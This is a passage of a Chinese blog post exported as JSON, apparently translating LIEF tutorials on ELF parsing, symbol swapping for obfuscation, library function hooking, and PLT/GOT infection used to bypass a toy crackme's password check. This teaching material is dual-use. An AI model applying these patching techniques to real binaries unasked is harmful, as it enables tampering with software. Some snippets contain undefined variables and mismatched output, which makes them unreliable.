lief.ELF.ARCH.AARCH64\n```\n\n并重建这个文件\n`binary.write(\"ls.modified\")`\n\n- 我们也可以遍历这个二进制文件的段部分\n\n```python\nfor section in sections:\n    print section.name\n    print section.size\n    print len(section.content)\n```\n\n也可以修改它的`.text`部分\n\n```python\ntext = binary.get_section(\".text\")\ntext.content = bytes([0x33] * text.size)\n```\n\n## 玩转ELF符号\n\n在本教程中，我们将会介绍如何修改二进制及库中的动态符号。当二进制文件将要链接到库的时候，所需要用到的库储存在动态表的DT_NEEDED条目中，所需要的功能在表中注册并具有以下属性：\n\n- `value` 设置为 `0`\n- `种类` 设置为 `FUNC`类似的，当一个库导出函数时，它在动态表中有一个DT_SONAME条目，导出的函数在动态符号表中注册，并具有如下属性：\n- `value` 设置为库中函数地址\n- `type` 设置为 `FUNC`而导入导出函数由LIEF来抽象，因此你可以使用`exported_functions`和`imported_functions`来遍历这些元素\n\n```python\nimport lief\nbinary  = lief.parse(\"/usr/bin/ls\")\nlibrary = lief.parse(\"/usr/lib/libc.so.6\")\nprint(binary.imported_functions)\nprint(library.exported_functions)\n```\n\n在分析二进制文件时，导入的函数名称对逆向工程非常有用。 一个解决方案是静态链接二进制文件和库。 另一个解决方案是通过交换这些符号来打击逆转者的思维。比如以下代码：\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n\ndouble hashme(double input) {\n  return pow(input, 4) + log(input + 3);\n}\n\nint main(int argc, char** argv) {\n  if (argc != 2) {\n    printf(\"Usage: %s N\\n\", argv[0]);\n    return EXIT_FAILURE;\n  }\n  double N = (double)atoi(argv[1]);\n  double hash = hashme(N);\n  printf(\"%f\\n\", hash);\n  return EXIT_SUCCESS;\n}\n```\n\n这本书基本上是让这个程序接受一个整数作为参数，并对这个值进行一些计算。\n\n```bash\n$ hasme 123\n228886645.836282\n```\n\n![](hashme.png)\n\n该pow和log功能都位于libm.so.6库中。使用LIEF的一个有趣的技巧是将此函数名称与其他函数名称交换。在本教程中，我们将把他们交换为cos和sin。首先，我们必须加载库和二进制文件：\n\n```python\n＃/usr/bin/env python3\nimport lief\nhasme = lief.parse(\"hasme\")\nlibm = lief.parse(\"/usr/lib/libm.so.6\")\n```\n\n然后当更改二进制中的两个导入函数的名称时：\n\n```python\nhashme_pow_sym = next(filter(lambda e : e.name == \"pow\", my_binary.imported_symbols))\nhashme_log_sym = next(filter(lambda e : e.name == \"log\", my_binary.imported_symbols))\nhashme_pow_sym.name = \"cos\"\nhashme_log_sym.name = \"sin\"\n```\n\n最后我们在库中用`log`交换`sin`，用`pow`交换`cos`，然后重构两个对象\n\n```python\n#!/usr/bin/env python3\nimport lief\n\n\nhasme = lief.parse(\"hasme\")\nlibm  = lief.parse(\"/usr/lib/libm.so.6\")\n\n\ndef swap(obj, a, b):\n    symbol_a = next(filter(lambda e : e.name == a, obj.dynamic_symbols))\n    symbol_b = next(filter(lambda e : e.name == b, obj.dynamic_symbols))\n    b_name = symbol_b.name\n    symbol_b.name = symbol_a.name\n    symbol_a.name = b_name\n\nhashme_pow_sym = next(filter(lambda e : e.name == \"pow\", my_binary.imported_symbols))\nhashme_log_sym = next(filter(lambda e : e.name == \"log\", my_binary.imported_symbols))\n\nhashme_pow_sym.name = \"cos\"\nhashme_log_sym.name = \"sin\"\n\n\nswap(libm, \"log\", \"sin\")\nswap(libm, \"pow\", \"cos\")\n\nhashme.write(\"hashme.obf\")\nlibm.write(\"libm.so.6\")\n```\n\n![](2.png)\n有了这个脚本，我们`libm`在当前目录下建立了一个修改，我们必须强制Linux加载器在执行时使用这个`binary.obf`。为此，我们export环境变量LD_LIBRARY_PATH到当前目录：\n\n```bash\n$ LD_LIBRARY_PATH=. hashme.obf 123\n228886645.836282\n```\n\n如果我们忽略它，它会使用默认`libm`和哈希计算完成`sin`和`cos`：\n\n```bash\n$ hashme.obf 123\n-0.557978\n```\n\n一个真正的用例可能是在像OpenSSL这样的密码库中交换符号。例如`EVP_DecryptInit`，`EVP_EncryptInit`有相同的原型，所以我们可以交换它们。\n\n## ELF挂钩\n\n本教程的目标是钩住一个库函数\n在前面的教程中，我们看到了如何从共享库中交换符号名称，现在我们将看到在共享库中挂钩函数的机制。\n\n目标库是标准的数学库(`libm.so`)，我们将在exp函数中插入一个钩子，使得\\(exp(x)= x + 1\\)。下面的清单给出了使用这个函数的样例的源代码：\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n\nint main(int argc, char **argv) {\n  if (argc != 2) {\n    printf(\"Usage: %s <a> \\n\", argv[0]);\n    exit(-1);\n  }\n\n  int a = atoi(argv[1]);\n  printf(\"exp(%d) = %f\\n\", a, exp(a));\n  return 0;\n}\n```\n\n挂钩功能如下:\n\n```C\ndouble hook(double x) {\n  return x + 1;\n}\n```\n\n编译`gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook`\n\n为了将这个钩子注入到库中，我们使用add()(段)方法\n\n`Binary.add(*args, **kwargs)`\n\n重载函数\n\n1.add(self: _pylief.ELF.Binary, arg0: LIEF::ELF::DynamicEntry) -> LIEF::ELF::DynamicEntry\n\ndynamic_entry\n\n2.add(self: _pylief.ELF.Binary, section: LIEF::ELF::Section, loaded: bool=True) -> LIEF::ELF::Section\n\n将给的`Section`添加到二进制文件中。\n如果该部分不应加载到内存中，loaded参数必须设置为False（默认值：True）\n\n3.add（self:_pylief.ELF.Binary, segment:LIEF::ELF::Segment, base:int = 0）-> LIEF::ELF::Segment\n\n在二进制文件中添加一个段\n\n4.add(self: _pylief.ELF.Binary, note: LIEF::ELF::Note) -> LIEF::ELF::Note\n\n在二进制文件中添加一个行的`Note`一旦stub被注入，我们只需要改变exp符号的地址：\n\n```python\nexp_symbol  = libm.get_symbol(\"exp\")\nhook_symbol = hook.get_symbol(\"hook\")\n\nexp_symbol.value = segment_added.virtual_address + hook_symbol.value\n```\n\n测试修补过的库：\n\n```bash\n./do_math.bin 1\nexp(1) = 2.718282\nLD_LIBRARY_PATH=. ./do_math.bin 1\nexp(1) = 2.000000\n```\n\n## 感染plt / got\n\n本教程的目标是在ELF二进制文件中挂接导入的函数。\n通过感染`.got`部分挂钩导入的函数是一个众所周知的技术，本教程将重点介绍使用LIEF的实现。\n\n这些数字说明了这个plt/got机制：\n![](3.png)\n使用延迟绑定，第一次调用该函数时，该`got`条目将重定向到plt指令。\n![](4.png)\n第二次，`got`条目在共享库中保存地址\n基本上感染分两步完成：\n\n- 首先，我们注入我们的钩子\n- 其次，我们通过打补丁将目标函数重定向到我们的钩子`got`\n\n可以用下图来总结：\n![](5.png)\n作为例子，我们将使用一个基本的crackme在`memcmp`上的Flag和用户的输入。\n\n```python\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n// Damn_YoU_Got_The_Flag\nchar password[] = \"\\x18\\x3d\\x31\\x32\\x03\\x05\\x33\\x09\\x03\\x1b\\x33\\x28\\x03\\x08\\x34\\x39\\x03\\x1a\\x30\\x3d\\x3b\";\n\ninline int check(char* input);\n\nint check(char* input) {\n  for (int i = 0; i < sizeof(password) - 1; ++i) {\n    password[i] ^= 0x5c;\n  }\n  return memcmp(password, input, sizeof(password) - 1);\n}\n\nint main(int argc, char **argv) {\n  if (argc != 2) {\n    printf(\"Usage: %s <password>\\n\", argv[0]);\n    return EXIT_FAILURE;\n  }\n\n  if (strlen(argv[1]) == (sizeof(password) - 1) && check(argv[1]) == 0) {\n    puts(\"You got it !!\");\n    return EXIT_SUCCESS;\n  }\n\n  puts(\"Wrong\");\n  return EXIT_FAILURE;\n\n}\n```\n\n这个Flag的值和`0x5c`进行了`xor`操作，为了验证crackme，用户必须输入`Damn_YoU_Got_The_Flag`:\n\n```bash\n$ crackme.bin foo\nWrong\n$ crackme.bin Damn_YoU_Got_The_Flag\nYou got it !!\n```\n\n挂钩将包含打印参数`memcmp`并返回0：\n\n```C\n#include \"arch/x86_64/syscall.c\"\n#define stdout 1\n\nint my_memcmp(const void* lhs, const void* rhs, int n) {\n  const char msg[] = \"Hook memcmp\\n\";\n  _write(stdout, msg, sizeof(msg));\n  _write(stdout, (const char*)lhs, n);\n  _write(stdout, \"\\n\", 2);\n  _write(stdout, (const char*)rhs, n);\n  _write(stdout, \"\\n\", 2);\n  return 0;\n}\n```\n\n由于钩子将被注入Creakme，因此它必须具备以下要求：\n\n- 汇编代码必须是位置独立的(使用`-fPIC`或`-pie/-fPIE`标记编译)\n- 不要使用外部库比如`libc.so`(标志)`-nostdlib -nodefaultlibs`(标志)\n\n基于要求，这个钩子的编译为：`gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook`\n\n### 注入钩子\n\n第一步是将钩子注入bin。为此我们将添加一个`Segment`:\n\n```python\nimport lief\n\ncrackme = lief.parse(\"crackme.bin\")\nhook    = lief.parse(\"hook\")\n\nsegment_added  = crackme.add(hook.segments[0])\n```\n\n钩子的所有汇编代码都存在`hook`的第一段的`LOAD`中。\n一旦钩子被添加，钩子的虚拟地址是`segment_added`的虚拟地址`virtual_address`,然后我们进行`got`patch。\n\n### Patching `got`\n\nLIEF提供了一个功能，可以轻松修补`got`与`Symbol`相关的条目：\n\n`Binary.patch_pltgot（* args，** kwargs ）`\n\n重载函数\n1.patch_pltgot(self: _pylief.ELF.Binary, symbol_name: str, address: int) -> None\n\n用导入的符号名称Patch `address`\n\n2.patch_pltgot(self: _pylief.ELF.Binary, symbol: LIEF::ELF::Symbol, address: int) -> None\n\nPatch导入的`Symbol`和`address`\n\n`memcmp`函数的偏移量存储在value关联的动态符号的属性中。因此，它的虚拟地址将是：\n\n- `my_memcpy`= `value` + `segment_added.virtual_address`\n\n```python\nmy_memcmp      = hook.get_symbol(\"my_memcmp\")\nmy_memcmp_addr = segment_added.virtual_address + my_memcmp.value\n```\n\n最后我们可以用`memcmp`的值来patch这个crackme.\n\n`crackme.patch_pltgot('memcmp', my_memcmp_addr)`\n\n最后rebuild\n\n`crackme.write(\"crackme.hooked\")`\n\n### 运行\n由于在检查标志值之前检查输入大小，我们必须提供正确长度的输入（不管其内容）：\n\n```bash\n$ crackme.hooked XXXXXXXXXXXXXXXXXXXXX\nHook add\nDamn_YoU_Got_The_Flag\nXXXXXXXXXXXXXXXXXXXXX\nYou got it !!\n```\n","source":"_posts/LIEF部分中文文档.md","raw":"---\ntitle: LIEF部分中文文档\ntags:\n  - PWN\n  - python\ncategories: []\ndate: 2017-12-13 23:07:20\n---\n\n# LIEF\n\n## 分析和操作格式\n\n这部分教程的目的是概述LIEF的API用来分析处理文件的格式\n// 由学弟翻译整理\n<!-- more -->\n\n### ELF\n\n- 我们从ELF格式开始。要从一个文件创建一个ELF.Binary,我们只需朝lief.parse()或lief.ELF.parse()函数传入他的路径。\n\n>注意：如果使用的是python的API，那么lief.parse()和lief.ELF.parse()具有相同的行为。但是在C++中，LIEF::Parser::parse()将返回指向LIEF::Binary对象的指针，而LIEF::ELF::Parser::parse()将返回LIEF::ELF::**\n\n```python\nimport lief\nBinary = lief.parse(\"/bin/ls\")\n```\n\n 一旦ELF文件被解析，我们可以访问它的Header\n\n`header = binary.header`\n\n 我们还可以更改它的入口点和目标架构(ARCH)\n\n```python\nheader.entrypoint = 0x123\nheader.machine_type = lief.ELF.ARCH.AARCH64\n```\n\n并重建这个文件\n`binary.write(\"ls.modified\")`\n\n- 我们也可以遍历这个二进制文件的段部分\n\n```python\nfor section in sections:\n    print section.name\n    print section.size\n    print len(section.content)\n```\n\n也可以修改它的`.text`部分\n\n```python\ntext = binary.get_section(\".text\")\ntext.content = bytes([0x33] * text.size)\n```\n\n## 玩转ELF符号\n\n在本教程中，我们将会介绍如何修改二进制及库中的动态符号。当二进制文件将要链接到库的时候，所需要用到的库储存在动态表的DT_NEEDED条目中，所需要的功能在表中注册并具有以下属性：\n\n- `value` 设置为 `0`\n- `种类` 设置为 `FUNC`类似的，当一个库导出函数时，它在动态表中有一个DT_SONAME条目，导出的函数在动态符号表中注册，并具有如下属性：\n- `value` 设置为库中函数地址\n- `type` 设置为 `FUNC`而导入导出函数由LIEF来抽象，因此你可以使用`exported_functions`和`imported_functions`来遍历这些元素\n\n```python\nimport lief\nbinary  = lief.parse(\"/usr/bin/ls\")\nlibrary = lief.parse(\"/usr/lib/libc.so.6\")\nprint(binary.imported_functions)\nprint(library.exported_functions)\n```\n\n在分析二进制文件时，导入的函数名称对逆向工程非常有用。 一个解决方案是静态链接二进制文件和库。 另一个解决方案是通过交换这些符号来打击逆转者的思维。比如以下代码：\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n\ndouble hashme(double input) {\n  return pow(input, 4) + log(input + 3);\n}\n\nint main(int argc, char** argv) {\n  if (argc != 2) {\n    printf(\"Usage: %s N\\n\", argv[0]);\n    return EXIT_FAILURE;\n  }\n  double N = (double)atoi(argv[1]);\n  double hash = hashme(N);\n  printf(\"%f\\n\", hash);\n  return EXIT_SUCCESS;\n}\n```\n\n这本书基本上是让这个程序接受一个整数作为参数，并对这个值进行一些计算。\n\n```bash\n$ hasme 123\n228886645.836282\n```\n\n![](hashme.png)\n\n该pow和log功能都位于libm.so.6库中。使用LIEF的一个有趣的技巧是将此函数名称与其他函数名称交换。在本教程中，我们将把他们交换为cos和sin。首先，我们必须加载库和二进制文件：\n\n```python\n＃/usr/bin/env python3\nimport lief\nhasme = lief.parse(\"hasme\")\nlibm = lief.parse(\"/usr/lib/libm.so.6\")\n```\n\n然后当更改二进制中的两个导入函数的名称时：\n\n```python\nhashme_pow_sym = next(filter(lambda e : e.name == \"pow\", my_binary.imported_symbols))\nhashme_log_sym = next(filter(lambda e : e.name == \"log\", my_binary.imported_symbols))\nhashme_pow_sym.name = \"cos\"\nhashme_log_sym.name = \"sin\"\n```\n\n最后我们在库中用`log`交换`sin`，用`pow`交换`cos`，然后重构两个对象\n\n```python\n#!/usr/bin/env python3\nimport lief\n\n\nhasme = lief.parse(\"hasme\")\nlibm  = lief.parse(\"/usr/lib/libm.so.6\")\n\n\ndef swap(obj, a, b):\n    symbol_a = next(filter(lambda e : e.name == a, obj.dynamic_symbols))\n    symbol_b = next(filter(lambda e : e.name == b, obj.dynamic_symbols))\n    b_name = symbol_b.name\n    symbol_b.name = symbol_a.name\n    symbol_a.name = b_name\n\nhashme_pow_sym = next(filter(lambda e : e.name == \"pow\", my_binary.imported_symbols))\nhashme_log_sym = next(filter(lambda e : e.name == \"log\", my_binary.imported_symbols))\n\nhashme_pow_sym.name = \"cos\"\nhashme_log_sym.name = \"sin\"\n\n\nswap(libm, \"log\", \"sin\")\nswap(libm, \"pow\", \"cos\")\n\nhashme.write(\"hashme.obf\")\nlibm.write(\"libm.so.6\")\n```\n\n![](2.png)\n有了这个脚本，我们`libm`在当前目录下建立了一个修改，我们必须强制Linux加载器在执行时使用这个`binary.obf`。为此，我们export环境变量LD_LIBRARY_PATH到当前目录：\n\n```bash\n$ LD_LIBRARY_PATH=. hashme.obf 123\n228886645.836282\n```\n\n如果我们忽略它，它会使用默认`libm`和哈希计算完成`sin`和`cos`：\n\n```bash\n$ hashme.obf 123\n-0.557978\n```\n\n一个真正的用例可能是在像OpenSSL这样的密码库中交换符号。例如`EVP_DecryptInit`，`EVP_EncryptInit`有相同的原型，所以我们可以交换它们。\n\n## ELF挂钩\n\n本教程的目标是钩住一个库函数\n在前面的教程中，我们看到了如何从共享库中交换符号名称，现在我们将看到在共享库中挂钩函数的机制。\n\n目标库是标准的数学库(`libm.so`)，我们将在exp函数中插入一个钩子，使得\\(exp(x)= x + 1\\)。下面的清单给出了使用这个函数的样例的源代码：\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n\nint main(int argc, char **argv) {\n  if (argc != 2) {\n    printf(\"Usage: %s <a> \\n\", argv[0]);\n    exit(-1);\n  }\n\n  int a = atoi(argv[1]);\n  printf(\"exp(%d) = %f\\n\", a, exp(a));\n  return 0;\n}\n```\n\n挂钩功能如下:\n\n```C\ndouble hook(double x) {\n  return x + 1;\n}\n```\n\n编译`gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook`\n\n为了将这个钩子注入到库中，我们使用add()(段)方法\n\n`Binary.add(*args, **kwargs)`\n\n重载函数\n\n1.add(self: _pylief.ELF.Binary, arg0: LIEF::ELF::DynamicEntry) -> LIEF::ELF::DynamicEntry\n\ndynamic_entry\n\n2.add(self: _pylief.ELF.Binary, section: LIEF::ELF::Section, loaded: bool=True) -> LIEF::ELF::Section\n\n将给的`Section`添加到二进制文件中。\n如果该部分不应加载到内存中，loaded参数必须设置为False（默认值：True）\n\n3.add（self:_pylief.ELF.Binary, segment:LIEF::ELF::Segment, base:int = 0）-> LIEF::ELF::Segment\n\n在二进制文件中添加一个段\n\n4.add(self: _pylief.ELF.Binary, note: LIEF::ELF::Note) -> LIEF::ELF::Note\n\n在二进制文件中添加一个行的`Note`一旦stub被注入，我们只需要改变exp符号的地址：\n\n```python\nexp_symbol  = libm.get_symbol(\"exp\")\nhook_symbol = hook.get_symbol(\"hook\")\n\nexp_symbol.value = segment_added.virtual_address + hook_symbol.value\n```\n\n测试修补过的库：\n\n```bash\n./do_math.bin 1\nexp(1) = 2.718282\nLD_LIBRARY_PATH=. ./do_math.bin 1\nexp(1) = 2.000000\n```\n\n## 感染plt / got\n\n本教程的目标是在ELF二进制文件中挂接导入的函数。\n通过感染`.got`部分挂钩导入的函数是一个众所周知的技术，本教程将重点介绍使用LIEF的实现。\n\n这些数字说明了这个plt/got机制：\n![](3.png)\n使用延迟绑定，第一次调用该函数时，该`got`条目将重定向到plt指令。\n![](4.png)\n第二次，`got`条目在共享库中保存地址\n基本上感染分两步完成：\n\n- 首先，我们注入我们的钩子\n- 其次，我们通过打补丁将目标函数重定向到我们的钩子`got`\n\n可以用下图来总结：\n![](5.png)\n作为例子，我们将使用一个基本的crackme在`memcmp`上的Flag和用户的输入。\n\n```python\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n// Damn_YoU_Got_The_Flag\nchar password[] = \"\\x18\\x3d\\x31\\x32\\x03\\x05\\x33\\x09\\x03\\x1b\\x33\\x28\\x03\\x08\\x34\\x39\\x03\\x1a\\x30\\x3d\\x3b\";\n\ninline int check(char* input);\n\nint check(char* input) {\n  for (int i = 0; i < sizeof(password) - 1; ++i) {\n    password[i] ^= 0x5c;\n  }\n  return memcmp(password, input, sizeof(password) - 1);\n}\n\nint main(int argc, char **argv) {\n  if (argc != 2) {\n    printf(\"Usage: %s <password>\\n\", argv[0]);\n    return EXIT_FAILURE;\n  }\n\n  if (strlen(argv[1]) == (sizeof(password) - 1) && check(argv[1]) == 0) {\n    puts(\"You got it !!\");\n    return EXIT_SUCCESS;\n  }\n\n  puts(\"Wrong\");\n  return EXIT_FAILURE;\n\n}\n```\n\n这个Flag的值和`0x5c`进行了`xor`操作，为了验证crackme，用户必须输入`Damn_YoU_Got_The_Flag`:\n\n```bash\n$ crackme.bin foo\nWrong\n$ crackme.bin Damn_YoU_Got_The_Flag\nYou got it !!\n```\n\n挂钩将包含打印参数`memcmp`并返回0：\n\n```C\n#include \"arch/x86_64/syscall.c\"\n#define stdout 1\n\nint my_memcmp(const void* lhs, const void* rhs, int n) {\n  const char msg[] = \"Hook memcmp\\n\";\n  _write(stdout, msg, sizeof(msg));\n  _write(stdout, (const char*)lhs, n);\n  _write(stdout, \"\\n\", 2);\n  _write(stdout, (const char*)rhs, n);\n  _write(stdout, \"\\n\", 2);\n  return 0;\n}\n```\n\n由于钩子将被注入Creakme，因此它必须具备以下要求：\n\n- 汇编代码必须是位置独立的(使用`-fPIC`或`-pie/-fPIE`标记编译)\n- 不要使用外部库比如`libc.so`(标志)`-nostdlib -nodefaultlibs`(标志)\n\n基于要求，这个钩子的编译为：`gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook`\n\n### 注入钩子\n\n第一步是将钩子注入bin。为此我们将添加一个`Segment`:\n\n```python\nimport lief\n\ncrackme = lief.parse(\"crackme.bin\")\nhook    = lief.parse(\"hook\")\n\nsegment_added  = crackme.add(hook.segments[0])\n```\n\n钩子的所有汇编代码都存在`hook`的第一段的`LOAD`中。\n一旦钩子被添加，钩子的虚拟地址是`segment_added`的虚拟地址`virtual_address`,然后我们进行`got`patch。\n\n### Patching `got`\n\nLIEF提供了一个功能，可以轻松修补`got`与`Symbol`相关的条目：\n\n`Binary.patch_pltgot（* args，** kwargs ）`\n\n重载函数\n1.patch_pltgot(self: _pylief.ELF.Binary, symbol_name: str, address: int) -> None\n\n用导入的符号名称Patch `address`\n\n2.patch_pltgot(self: _pylief.ELF.Binary, symbol: LIEF::ELF::Symbol, address: int) -> None\n\nPatch导入的`Symbol`和`address`\n\n`memcmp`函数的偏移量存储在value关联的动态符号的属性中。因此，它的虚拟地址将是：\n\n- `my_memcpy`= `value` + `segment_added.virtual_address`\n\n```python\nmy_memcmp      = hook.get_symbol(\"my_memcmp\")\nmy_memcmp_addr = segment_added.virtual_address + my_memcmp.value\n```\n\n最后我们可以用`memcmp`的值来patch这个crackme.\n\n`crackme.patch_pltgot('memcmp', my_memcmp_addr)`\n\n最后rebuild\n\n`crackme.write(\"crackme.hooked\")`\n\n### 运行\n由于在检查标志值之前检查输入大小，我们必须提供正确长度的输入（不管其内容）：\n\n```bash\n$ crackme.hooked XXXXXXXXXXXXXXXXXXXXX\nHook add\nDamn_YoU_Got_The_Flag\nXXXXXXXXXXXXXXXXXXXXX\nYou got it !!\n```\n","slug":"LIEF部分中文文档","published":1,"updated":"2017-12-13T15:11:26.355Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jz7001jhv18821mqaxb","content":"<h1 id=\"LIEF\"><a href=\"#LIEF\" class=\"headerlink\" title=\"LIEF\"></a>LIEF</h1><h2 id=\"分析和操作格式\"><a href=\"#分析和操作格式\" class=\"headerlink\" title=\"分析和操作格式\"></a>分析和操作格式</h2><p>这部分教程的目的是概述LIEF的API用来分析处理文件的格式<br>// 由学弟翻译整理<br><a id=\"more\"></a></p>\n<h3 id=\"ELF\"><a href=\"#ELF\" class=\"headerlink\" title=\"ELF\"></a>ELF</h3><ul>\n<li>我们从ELF格式开始。要从一个文件创建一个ELF.Binary,我们只需朝lief.parse()或lief.ELF.parse()函数传入他的路径。</li>\n</ul>\n<blockquote>\n<p>注意：如果使用的是python的API，那么lief.parse()和lief.ELF.parse()具有相同的行为。但是在C++中，LIEF::Parser::parse()将返回指向LIEF::Binary对象的指针，而LIEF::ELF::Parser::parse()将返回LIEF::ELF::**</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\">Binary = lief.parse(<span class=\"string\">\"/bin/ls\"</span>)</div></pre></td></tr></table></figure>\n<p> 一旦ELF文件被解析，我们可以访问它的Header</p>\n<p><code>header = binary.header</code></p>\n<p> 我们还可以更改它的入口点和目标架构(ARCH)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">header.entrypoint = <span class=\"number\">0x123</span></div><div class=\"line\">header.machine_type = lief.ELF.ARCH.AARCH64</div></pre></td></tr></table></figure>\n<p>并重建这个文件<br><code>binary.write(&quot;ls.modified&quot;)</code></p>\n<ul>\n<li>我们也可以遍历这个二进制文件的段部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> section <span class=\"keyword\">in</span> sections:</div><div class=\"line\">    <span class=\"keyword\">print</span> section.name</div><div class=\"line\">    <span class=\"keyword\">print</span> section.size</div><div class=\"line\">    <span class=\"keyword\">print</span> len(section.content)</div></pre></td></tr></table></figure>\n<p>也可以修改它的<code>.text</code>部分</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">text = binary.get_section(<span class=\"string\">\".text\"</span>)</div><div class=\"line\">text.content = bytes([<span class=\"number\">0x33</span>] * text.size)</div></pre></td></tr></table></figure>\n<h2 id=\"玩转ELF符号\"><a href=\"#玩转ELF符号\" class=\"headerlink\" title=\"玩转ELF符号\"></a>玩转ELF符号</h2><p>在本教程中，我们将会介绍如何修改二进制及库中的动态符号。当二进制文件将要链接到库的时候，所需要用到的库储存在动态表的DT_NEEDED条目中，所需要的功能在表中注册并具有以下属性：</p>\n<ul>\n<li><code>value</code> 设置为 <code>0</code></li>\n<li><code>种类</code> 设置为 <code>FUNC</code>类似的，当一个库导出函数时，它在动态表中有一个DT_SONAME条目，导出的函数在动态符号表中注册，并具有如下属性：</li>\n<li><code>value</code> 设置为库中函数地址</li>\n<li><code>type</code> 设置为 <code>FUNC</code>而导入导出函数由LIEF来抽象，因此你可以使用<code>exported_functions</code>和<code>imported_functions</code>来遍历这些元素</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\">binary  = lief.parse(<span class=\"string\">\"/usr/bin/ls\"</span>)</div><div class=\"line\">library = lief.parse(<span class=\"string\">\"/usr/lib/libc.so.6\"</span>)</div><div class=\"line\">print(binary.imported_functions)</div><div class=\"line\">print(library.exported_functions)</div></pre></td></tr></table></figure>\n<p>在分析二进制文件时，导入的函数名称对逆向工程非常有用。 一个解决方案是静态链接二进制文件和库。 另一个解决方案是通过交换这些符号来打击逆转者的思维。比如以下代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">hashme</span><span class=\"params\">(<span class=\"keyword\">double</span> input)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">pow</span>(input, <span class=\"number\">4</span>) + <span class=\"built_in\">log</span>(input + <span class=\"number\">3</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Usage: %s N\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">    <span class=\"keyword\">return</span> EXIT_FAILURE;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">double</span> N = (<span class=\"keyword\">double</span>)atoi(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">  <span class=\"keyword\">double</span> hash = hashme(N);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%f\\n\"</span>, hash);</div><div class=\"line\">  <span class=\"keyword\">return</span> EXIT_SUCCESS;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>这本书基本上是让这个程序接受一个整数作为参数，并对这个值进行一些计算。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hasme 123</div><div class=\"line\">228886645.836282</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/12/13/LIEF部分中文文档/hashme.png\" alt=\"\"></p>\n<p>该pow和log功能都位于libm.so.6库中。使用LIEF的一个有趣的技巧是将此函数名称与其他函数名称交换。在本教程中，我们将把他们交换为cos和sin。首先，我们必须加载库和二进制文件：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">＃/usr/bin/env python3</div><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\">hasme = lief.parse(<span class=\"string\">\"hasme\"</span>)</div><div class=\"line\">libm = lief.parse(<span class=\"string\">\"/usr/lib/libm.so.6\"</span>)</div></pre></td></tr></table></figure>\n<p>然后当更改二进制中的两个导入函数的名称时：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div 